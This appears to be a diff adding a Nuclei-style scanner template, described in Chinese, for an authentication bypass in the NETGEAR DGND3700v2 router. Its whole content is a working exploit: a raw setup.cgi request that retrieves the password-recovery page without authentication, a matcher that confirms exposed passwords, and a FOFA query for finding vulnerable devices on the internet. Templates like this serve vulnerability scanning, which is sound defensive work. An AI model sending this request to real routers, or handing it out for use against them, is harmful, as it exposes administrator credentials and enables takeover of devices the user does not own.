@@ -1,0 +1,25 @@
+id: netgear-router-setup-unauth
+
+info:
+  name: NETGEAR DGND3700v2 路由器 setup.cgi 接口身份认证绕过漏洞
+  author: m0be1
+  severity: high
+  description: NETGEAR DGND3700v2 是一款高效的企业路由器，NETGEAR DGND3700v2 存在身份认证绕过漏洞，攻击者可利用漏洞读取用户账号密码，访问敏感信息页面。
+
+  reference:
+    - https://
+  metadata: 
+    fofa-query: title="DGND3700v2"
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"password")
